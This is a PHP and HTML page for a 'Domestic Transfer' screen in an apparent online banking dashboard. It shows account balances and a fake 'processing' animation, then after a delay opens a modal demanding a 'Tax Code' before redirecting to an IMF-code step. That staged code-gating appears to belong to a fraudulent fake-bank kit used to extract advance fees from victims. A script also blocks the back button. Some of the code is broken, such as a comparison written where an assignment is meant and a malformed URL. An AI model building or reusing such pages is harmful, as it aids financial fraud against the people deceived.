<?php
session_start();
include_once ('../include/session.php');
require_once '../include/class.user.php';

if (!isset($_SESSION['acc_no'])) {
	
header("Location: login.php");
exit(); 
}
$url != 'http://secure..com/tax_auth.php';

if ($_SERVER['HTTP_REFERER'] == $url) {
  header('Location: wire.php'); //redirect to some other page
  exit();
}

$reg_user = new USER();
$stmt = $reg_user->runQuery("SELECT * FROM account WHERE acc_no=:acc_no");
$stmt->execute(array(":acc_no"=>$_SESSION['acc_no']));
$row = $stmt->fetch(PDO::FETCH_ASSOC);

if(isset($_POST['code'])){
	$tax = $row['tax'];
	$sub = $_POST['tax'];
	if($sub !== $tax){
		header("Location: wire.php?errortax");
	}
	else {
		header("Location: imf.php");
	}
}

?>
<!DOCTYPE html>
<html>
  <head>
    <title>Domestic Transfer</title>
    <meta charset="utf-8">
    <meta content="ie=edge" http-equiv="x-ua-compatible">
    
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="favicon.png" rel="shortcut icon">
    <link href="apple-touch-icon.png" rel="apple-touch-icon">
	 <script src="assets/js/jquery.circlechart2.js"></script>
	  <script src="assets/js/jquery-1.11.1.min.js"></script>
        <link href="assets/plugins/jquery-ui/themes/base/minified/jquery-ui.mi.css" rel="stylesheet" />
		 
		  <link href="assets/plugins/icon/themify-icons/themify-icons.css" rel="stylesheet" />
        <link href="assets/css/animate.min.css" rel="stylesheet" />
        <link href="assets/css/style.min.css" rel="stylesheet" />
        <link href="assets/css/preloader.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Rubik:300,400,500" rel="stylesheet" type="text/css">
    <link href="bower_components/select2/dist/css/select2.min.css" rel="stylesheet">
    <link href="bower_components/bootstrap-daterangepicker/daterangepicker.css" rel="stylesheet">
    <link href="bower_components/dropzone/dist/dropzone.css" rel="stylesheet">
    <link href="bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css" rel="stylesheet">
    <link href="bower_components/fullcalendar/dist/fullcalendar.min.css" rel="stylesheet">
    <link href="bower_components/perfect-scrollbar/css/perfect-scrollbar.min.css" rel="stylesheet">
    <link href="bower_components/slick-carousel/slick/slick.css" rel="stylesheet">
    <link href="css/main.css?version=4.4.0" rel="stylesheet">
	
	
	<link rel="stylesheet" type="text/css" href="clock_style.css">
	<style>.alert-success {
    color: #090909;
    background-color: #e2e9e1;
    border-color: #36b927;
}
}</style>	
  <script type="text/javascript">
    window.onload = setInterval(clock,1000);

    function clock()
    {
	  var d = new Date();
	  
	  var date = d.getDate();
	  
	  var month = d.getMonth();
	  var montharr =["Jan","Feb","Mar","April","May","June","July","Aug","Sep","Oct","Nov","Dec"];
	  month=montharr[month];
	  
	  var year = d.getFullYear();
	  
	  var day = d.getDay();
	  var dayarr =["Sun","Mon","Tues","Wed","Thurs","Fri","Sat"];
	  day=dayarr[day];
	  
	  var hour =d.getHours();
      var min = d.getMinutes();
	  var sec = d.getSeconds();
	
	  document.getElementById("date").innerHTML=day+" "+date+" "+month+" "+year;
	  document.getElementById("time").innerHTML=hour+":"+min+":"+sec;
    }
	
	
	
	 var result;
    
    function showPosition(){
        // Store the element where the page displays the result
        result = document.getElementById("result");
        
        // If geolocation is available, try to get the visitor's position
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
            result.innerHTML = "Getting the position information...";
        } else{
            alert("Sorry, your browser does not support HTML5 geolocation.");
        }
    };
    
    // Define callback function for successful attempt
    function successCallback(position){
        result.innerHTML = "Your current position is (" + "Latitude: " + position.coords.latitude + ", " + "Longitude: " + position.coords.longitude + ")";
    }
    
    // Define callback function for failed attempt
    function errorCallback(error){
        if(error.code == 1){
            result.innerHTML = "You've decided not to share your position, but it's OK. We won't ask you again.";
        } else if(error.code == 2){
            result.innerHTML = "The network is down or the positioning service can't be reached.";
        } else if(error.code == 3){
            result.innerHTML = "The attempt timed out before it could get the location data.";
        } else{
            result.innerHTML = "Geolocation failed due to unknown error.";
        }
    }
  </script>
	
	<!-- ================== BEGIN BASE JS ================== -->
        <script src="assets/plugins/loader/pace/pace.min.js"></script>
        <script type="text/javascript">
            (function(global) {

                if (typeof (global) === "undefined")
                {
                    throw new Error("window is undefined");
                }

                var _hash = "!";
                var noBackPlease = function() {
                    global.location.href += "#";

                    // making sure we have the fruit available for juice....
                    // 50 milliseconds for just once do not cost much (^__^)
                    global.setTimeout(function() {
                        global.location.href += "!";
                    }, 50);
                };

                // Earlier we had setInerval here....
                global.onhashchange = function() {
                    if (global.location.hash !== _hash) {
                        global.location.hash = _hash;
                    }
                };

                global.onload = function() {

                    noBackPlease();

                    // disables backspace on page except on input fields and textarea..
                    document.body.onkeydown = function(e) {
                        var elm = e.target.nodeName.toLowerCase();
                        if (e.which === 8 && (elm !== 'input' && elm !== 'textarea')) {
                            e.preventDefault();
                        }
                        // stopping event bubbling up the DOM tree..
                        e.stopPropagation();
                    };

                };

            })(window);
        </script>
        <!-- ================== END BASE JS ================== -->
  </head>
  <body class="menu-position-side menu-side-left full-screen with-content-panel">
    <div class="all-wrapper with-side-panel solid-bg-all">
		
      <div class="search-with-suggestions-w">
        <div class="search-with-suggestions-modal">
          <div class="element-search">
			<input class="search-suggest-input" placeholder="Start typing to search..." type="text">
              <div class="close-search-suggestions">
                <i class="os-icon os-icon-x"></i>
              </div>
            </input>
          </div>
		  
		  
		  
          <div class="search-suggestions-group">
            <div class="ssg-header">
              <div class="ssg-icon">
                <div class="os-icon os-icon-box"></div>
              </div>
              <div class="ssg-name">
                Projects
              </div>
              <div class="ssg-info">
                24 Total
              </div>
            </div>
            <div class="ssg-content">
              <div class="ssg-items ssg-items-boxed">
                <a class="ssg-item" href="users_profile_big.html">
                  <div class="item-media" style="background-image: url(img/company6.png)"></div>
                  <div class="item-name">
                    Integ<span>ration</span> with API
                  </div>
                </a><a class="ssg-item" href="users_profile_big.html">
                  <div class="item-media" style="background-image: url(img/company7.png)"></div>
                  <div class="item-name">
                    Deve<span>lopm</span>ent Project
                  </div>
                </a>
              </div>
            </div>
          </div>
          <div class="search-suggestions-group">
            <div class="ssg-header">
              <div class="ssg-icon">
                <div class="os-icon os-icon-users"></div>
              </div>
              <div class="ssg-name">
                Customers
              </div>
              <div class="ssg-info">
                12 Total
              </div>
            </div>
            <div class="ssg-content">
              <div class="ssg-items ssg-items-list">
                <a class="ssg-item" href="users_profile_big.html">
                  <div class="item-media" style="background-image: url(admin/pic/<?php echo $row['acc_no']; ?>.jpg)"></div>
                  <div class="item-name">
                    John Ma<span>yer</span>s
                  </div>
                </a><a class="ssg-item" href="users_profile_big.html">
                  <div class="item-media" style="background-image: url(img/avatar2.jpg)"></div>
                  <div class="item-name">
                    Th<span>omas</span> Mullier
                  </div>
                </a><a class="ssg-item" href="users_profile_big.html">
                  <div class="item-media" style="background-image: url(img/avatar3.jpg)"></div>
                  <div class="item-name">
                    Kim C<span>olli</span>ns
                  </div>
                </a>
              </div>
            </div>
          </div>
          <div class="search-suggestions-group">
            <div class="ssg-header">
              <div class="ssg-icon">
                <div class="os-icon os-icon-folder"></div>
              </div>
              <div class="ssg-name">
                Files
              </div>
              <div class="ssg-info">
                17 Total
              </div>
            </div>
            <div class="ssg-content">
              <div class="ssg-items ssg-items-blocks">
                <a class="ssg-item" href="#">
                  <div class="item-icon">
                    <i class="os-icon os-icon-file-text"></i>
                  </div>
                  <div class="item-name">
                    Work<span>Not</span>e.txt
                  </div>
                </a><a class="ssg-item" href="#">
                  <div class="item-icon">
                    <i class="os-icon os-icon-film"></i>
                  </div>
                  <div class="item-name">
                    V<span>ideo</span>.avi
                  </div>
                </a><a class="ssg-item" href="#">
                  <div class="item-icon">
                    <i class="os-icon os-icon-database"></i>
                  </div>
                  <div class="item-name">
                    User<span>Tabl</span>e.sql
                  </div>
                </a><a class="ssg-item" href="#">
                  <div class="item-icon">
                    <i class="os-icon os-icon-image"></i>
                  </div>
                  <div class="item-name">
                    wed<span>din</span>g.jpg
                  </div>
                </a>
              </div>
              <div class="ssg-nothing-found">
                <div class="icon-w">
                  <i class="os-icon os-icon-eye-off"></i>
                </div>
                <span>No files were found. Try changing your query...</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="layout-w">
        <!--------------------
        START - Mobile Menu
        -------------------->
        <?php include 'mobmenu.php';
?>
        <!--------------------
        END - Mobile Menu
        <!--------------------
        <?php include 'mainmenu.php';
?>
      
        <div class="content-w">
         
          <div class="top-bar color-scheme-transparent">
            <!--------------------
            START - Top Menu Controls
            -------------------->
            <div class="top-menu-controls">
              <div class="">
               
              </div>
              <!--------------------
              START - Messages Link in secondary top menu
              -------------------->
              <div class="messages-notifications os-dropdown-trigger os-dropdown-position-left">
                <i class="os-icon os-icon-mail-14"></i>
                
                
                 
                
              </div>
              <!--------------------
              END - Messages Link in secondary top menu
              --------------------><!--------------------
              START - Settings Link in secondary top menu
              -------------------->
              <div class="top-icon top-settings os-dropdown-trigger os-dropdown-position-left">
                <i class="os-icon os-icon-ui-46"></i>
                <div class="os-dropdown">
                  <div class="icon-w">
                    <i class="os-icon os-icon-ui-46"></i>
                  </div>
                  <ul>
                    <li>
                      <a href="profile.php"><i class="os-icon os-icon-ui-49"></i><span>My Profile</span></a>
                    </li>
					<li>
                      <a href="logout.php"><i class="os-icon os-icon-lock"></i><span>Logout</span></a>
                    </li>
                    
                  </ul>
                </div>
              </div>
              <!--------------------
              END - Settings Link in secondary top menu
              --------------------><!--------------------
              START - User avatar and menu in secondary top menu
              -------------------->
              <div class="logged-user-w">
                <div class="">
                  <div class="avatar-w">
                    <img alt="" src="admin/pic/<?php echo $row['acc_no']; ?>.jpg">
                  </div>
                  <div class="logged-user-menu color-style-bright">
                    <div class="logged-user-avatar-info">
                      <div class="avatar-w">
                        <img alt="" src="admin/pic/<?php echo $row['acc_no']; ?>.jpg">
                      </div>
                      <div class="logged-user-info-w">
                        <div class="logged-user-name">
                        Logout
                        </div>
                        
                      </div>
                    </div>
                    <div class="bg-icon">
                      <i class="os-icon os-icon-wallet-loaded"></i>
                    </div>
                   
                  </div>
                </div>
              </div>
              <!--------------------
              END - User avatar and menu in secondary top menu
              -------------------->
            </div>
            <!--------------------
            END - Top Menu Controls
            -------------------->
          </div>
          <!--------------------
          END - Top Bar
          --------------------><!--------------------
          START - Breadcrumbs
          -------------------->
         <?php include 'bread.php';
?>
          <!--------------------
          END - Breadcrumbs
          -------------------->
          <div class="content-panel-toggler">
            <i class="os-icon os-icon-grid-squares-22"></i><span>Sidebar</span>
          </div>
          <div class="content-i">
            <div class="content-box">
              <div class="row">
                <div class="col-sm-12">
                  <div class="element-wrapper">
                    <div class="element-actions">
                      <!-- <form class="form-inline justify-content-sm-end"> -->
                        <!-- <select class="form-control form-control-sm rounded"> -->
                          <!-- <option value="Pending"> -->
                            <!-- Today -->
                          <!-- </option> -->
                          <!-- <option value="Active"> -->
                            <!-- Last Week  -->
                          <!-- </option> -->
                          <!-- <option value="Cancelled"> -->
                            <!-- Last 30 Days -->
                          <!-- </option> -->
                        <!-- </select> -->
                      <!-- </form> -->
                    </div>
					
					
					 <h6 class="element-header">
                      AUTHENTICATING TRANSFER
                    </h6>
                    <div class="element-content">
                      <div class="row">
                        <div class="col-sm-4 col-xxxl-3">
                          <a class="element-box el-tablo" href="#">
                            <div class="label">
                              Book Balance
                            </div>
                            <div class="value"><span style="color:orange;font-size:20px;">
                             <p><?php echo $row['currency']; ?><?php echo  $english_format_number = number_format( $row['t_bal'] , 2, '.', ','); ?></p>
                            </span></div>
                            
                          </a>
                        </div>
						
                        <div class="col-sm-4 col-xxxl-3">
                          <a class="element-box el-tablo" href="#">
                            <div class="label">
                              Available Balance
                            </div>
                            <div class="value"><span style="color:green;font-size:20px;">
                              <?php echo $row['currency']; ?><?php echo number_format( $row['a_bal'] , 2, '.', ','); ?>
                            </span></div>
                            
                          </a>
                        </div>
                         <div class="col-sm-4 col-xxxl-3">
                          <a class="element-box el-tablo" href="#">
                           <div class="label">
                              Account Logged in from:
                            </div>
                            <div class="value"><span style="color:green;font-size:15px;">
                              <?php  if (getenv('HTTP_X_FORWARDED_FOR')) { $pipaddress = getenv('HTTP_X_FORWARDED_FOR');
 $ipaddress = getenv('REMOTE_ADDR'); 
    echo " : ".$pipaddress. "" ; } 
    ?>     
                            </span></div>
                           
                          </a>
                        </div>
                        <div class="d-none d-xxxl-block col-xxxl-3">
                          <a class="element-box el-tablo" href="#">
                            <div class="label">
                              Refunds Processed
                            </div>
                            <div class="value">
                              $294
                            </div>
                            <div class="trending trending-up-basic">
                              <span>12%</span><i class="os-icon os-icon-arrow-up2"></i>
                            </div>
                          </a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
			  
            
                  <!-- <!--END - Top Selling Chart--> 
               
			  
			  
              <div class="row">
                <div class="col-sm-12">
                  <div class="element-wrapper">
                    <h6 class="element-header">
                      TRANSFER FORM
                    </h6>
					
                    <div class="element-box-tp">
                      <!--------------------
                      START - Controls Above Table
                      -------------------->
                      <div class="controls-above-table">
                        <div class="row">
                          <div class="col-sm-6">
                            <!-- <a class="btn btn-sm btn-secondary" href="#">Download CSV</a><a class="btn btn-sm btn-secondary" href="#">Archive</a><a class="btn btn-sm btn-danger" href="#">Delete</a> -->
                          </div>
                          <div class="col-sm-6">
                            Authenticating Transfer
							</br>
							 <marquee bgcolor="green" style= color:white;>PLEASE WAIT<span style="color:orange;">PROCESSING</span></marquee>
				
                          </div>
                        </div>
                      </div>
					  
					  
                      <!--------------------
                      END - Controls Above Table
                      ------------------          --><!--------------------
                      START - Table with actions
                      ------------------  -->
					  
                      <div class="table-responsive">
                        <div class="col-lg-12">
    <div class="element-wrapper">
      
      <div class="element-box">
        <div class="row">
                                <div class="col-sm-8"><h4 class="loader"></h4></div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-sm-8">
                                    <div class="circle-charts" style="color:#00008B;">
                                        <div class="demo-1" data-percent="100"></div><span></span>
                                    </div>
                                </div>	
                            </div>
      </div>
    </div>
  </div>
                      </div>
					   <script>
                    $('.demo-1').percentcircle();
                    $('.demo-2').percentcircle({
                        animate: true,
                        diameter: 200,
                        guage: 10,
                        coverBg: '#00008B;',
                        bgColor: '#efefef',
                        fillColor: '#e94e02',
                        percentSize: '15px',
                        percentWeight: 'normal'

                    });

                    $('.demo-3').percentcircle({
                        animate: true,
                        diameter: 100,
                        guage: 3,
                        coverBg: '#00008B;',
                        bgColor: '#efefef',
                        fillColor: '#F2B33F',
                        percentSize: '15px',
                        percentWeight: 'normal'
                    });
                </script>
				<!-- BEGIN modal -->
							<div class="modal modal-cover modal-inverse fade" id="full-cover-inverse-modal">
								<div class="modal-dialog">
									<div class="modal-content">
										<div class="modal-header">
											
											<p>
												Tax Code is required. 
												
											</p>
										</div>
										<div class="modal-body">
										<form method="post" action="">
											<div class="row">
												<div class="col-md-9 col-sm-12">
													<input type="text" placeholder="Enter Tax code here..." class="form-control input-lg no-border" name="tax">
												</div>
												<div class="col-md-3 col-sm-12">
													<button type="submit" name="code" class="btn btn-success btn-lg btn-block">Continue</button>
												</div>
											</div>
											</form>
											<div class="text-right p-t-10">
												<a href="#" class="text-muted"></a>
											</div>
										</div>
										<div class="modal-footer">
										</div>
									</div>
								</div>
							</div>
		<!-- BEGIN btn-scroll-top -->
		<a href="index.php#" data-click="scroll-top" class="btn-scroll-top fade"><i class="ti-arrow-up"></i></a>
		<!-- END btn-scroll-top -->
	</div>
	<!-- END #page-container -->
	<script>
		$(document).ready(function() {
    setTimeout(function() {
      $('#full-cover-inverse-modal').modal('show');
    }, 7000); // milliseconds
	});
	</script>
                      <!--------------------
                      END - Table with actions
                      ------------------            -->
					  <!--------------------
					  
                      ------------------  -->
					  </br>
					  <hr>
					  
					  
					  
					  
					  
                      
                      <!--------------------
                      END - Controls below table
                      -------------------->
                    </div>
                  </div>
                </div>
              </div><!--------------------
              START - Color Scheme Toggler
              -------------------->
              
              <!--------------------
              END - Color Scheme Toggler
              --------------------><!--------------------
              START - Demo Customizer
              -------------------->
              
              <!--------------------
              END - Demo Customizer
              --------------------><!--------------------
              START - Chat Popup Box
              -------------------->
              
              <!--------------------
              END - Chat Popup Box
              -------------------->
            </div>
            <!--------------------
          START - Sidebar
            -------------------->
            <div class="content-panel">
              <div class="content-panel-close">
                <i class="os-icon os-icon-close"></i>
              </div>
              <div class="element-wrapper">
                <h6 class="element-header">
                  QUICK VIEWS 
                </h6>
                <div class="element-box-tp">
				
				
   
				
				 <!--START - MESSAGE ALERT-->
                      <div class="alert alert-success borderless">
                        
                        
						<div id="date"></div>
					                        
                        <div class="alert-btn"></div>
                      </div>
                      <!--END - MESSAGE ALERT-->
					  
					  
					   <!--START - MESSAGE ALERT-->
                      <div class="alert alert-success borderless">
                       
                        <div class="alert-btn">
                        </div>
                      </div>
                      <!--END - MESSAGE ALERT-->
					  
				
                  <!-- <div class="el-buttons-list full-width"> -->
                    <!-- <a class="btn btn-white btn-sm" href="#"><i class="os-icon os-icon-delivery-box-2"></i><span>Create New Product</span></a><a class="btn btn-white btn-sm" href="#"><i class="os-icon os-icon-window-content"> -->
					<!-- </i><span>Customer Comments</span></a><a class="btn btn-white btn-sm" href="#"><i class="os-icon os-icon-wallet-loaded"></i> -->
					<!-- <span>Store Settings</span></a> -->
                  <!-- </div> -->
                </div>
              </div>
              <!--------------------
              START - Support Agents
              -------------------->
              <div class="element-wrapper">
                <h6 class="element-header">
                  TIPS
                </h6>
                <div class="element-box-tp">
                  <div class="profile-tile">
                    <a class="profile-tile-box" href="users_profile_small.html">
                      <div class="pt-avatar-w">
                        <img alt="" src="admin/pic/<?php echo $row['acc_no']; ?>.jpg">
                      </div>
                      <div class="pt-user-name">
                        online
                      </div>
                    </a>
                    <div class="profile-tile-meta">
                      <ul>
                        <li>
                          <strong>Your Transfer is Processing!</strong>
                        </li>
                         <li>
                          Do you have issues regarding Transfer? Feel free to contact Customer care
                        </li>
                      </ul>
                      <div class="pt-btn">
                        <a class="btn btn-success btn-sm" href="/contact/index.php">Contact Customer care</a>
                      </div>
                    </div>
                  </div>
                 
                </div>
              </div>
             
             
            </div>
            <!--------------------
            END - Sidebar
            -------------------->
          </div>
        </div>
      </div>
      <div class="display-type"></div>
    </div>
	<!-- Footer -->
<footer class="page-footer font-small blue">

  <!-- Copyright -->
  <?php include 'footercopyright.php';
?>
  <!-- Copyright -->

</footer>
      <div class="display-type"></div>
    </div>
    <script src="bower_components/jquery/dist/jquery.min.js"></script>
    <script src="bower_components/popper.js/dist/umd/popper.min.js"></script>
    <script src="bower_components/moment/moment.js"></script>
    <script src="bower_components/chart.js/dist/Chart.min.js"></script>
    <script src="bower_components/select2/dist/js/select2.full.min.js"></script>
    <script src="bower_components/jquery-bar-rating/dist/jquery.barrating.min.js"></script>
    <script src="bower_components/ckeditor/ckeditor.js"></script>
    <script src="bower_components/bootstrap-validator/dist/validator.min.js"></script>
    <script src="bower_components/bootstrap-daterangepicker/daterangepicker.js"></script>
    <script src="bower_components/ion.rangeSlider/js/ion.rangeSlider.min.js"></script>
    <script src="bower_components/dropzone/dist/dropzone.js"></script>
    <script src="bower_components/editable-table/mindmup-editabletable.js"></script>
    <script src="bower_components/datatables.net/js/jquery.dataTables.min.js"></script>
    <script src="bower_components/datatables.net-bs/js/dataTables.bootstrap.min.js"></script>
    <script src="bower_components/fullcalendar/dist/fullcalendar.min.js"></script>
    <script src="bower_components/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js"></script>
    <script src="bower_components/tether/dist/js/tether.min.js"></script>
    <script src="bower_components/slick-carousel/slick/slick.min.js"></script>
    <script src="bower_components/bootstrap/js/dist/util.js"></script>
    <script src="bower_components/bootstrap/js/dist/alert.js"></script>
    <script src="bower_components/bootstrap/js/dist/button.js"></script>
    <script src="bower_components/bootstrap/js/dist/carousel.js"></script>
    <script src="bower_components/bootstrap/js/dist/collapse.js"></script>
    <script src="bower_components/bootstrap/js/dist/dropdown.js"></script>
    <script src="bower_components/bootstrap/js/dist/modal.js"></script>
    <script src="bower_components/bootstrap/js/dist/tab.js"></script>
    <script src="bower_components/bootstrap/js/dist/tooltip.js"></script>
    <script src="bower_components/bootstrap/js/dist/popover.js"></script>
    <script src="js/demo_customizer.js?version=4.4.0"></script>
    <script src="js/main.js?version=4.4.0"></script>
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
      
      ga('create', 'UA-XXXXXXX-9', 'auto');
      ga('send', 'pageview');
    </script>
	
            <!-- ================== BEGIN BASE JS ================== -->
            <script src="assets/plugins/jquery/jquery-1.9.1.min.js"></script>

            <script src="assets/js/bootstrap.js"></script>

            <script src="assets/js/validator.min.js"></script>

            <script src="assets/js/jquery.circlechart2.js"></script>

            <script src="assets/plugins/scrollbar/slimscroll/jquery.slimscroll.min.js"></script>
            <!-- ================== END BASE JS ================== -->
			
			 <script>
                $(document).ready(function() {
                    App.init();
                    FormWizards.init();
                });
            </script>
  </body>
</html>
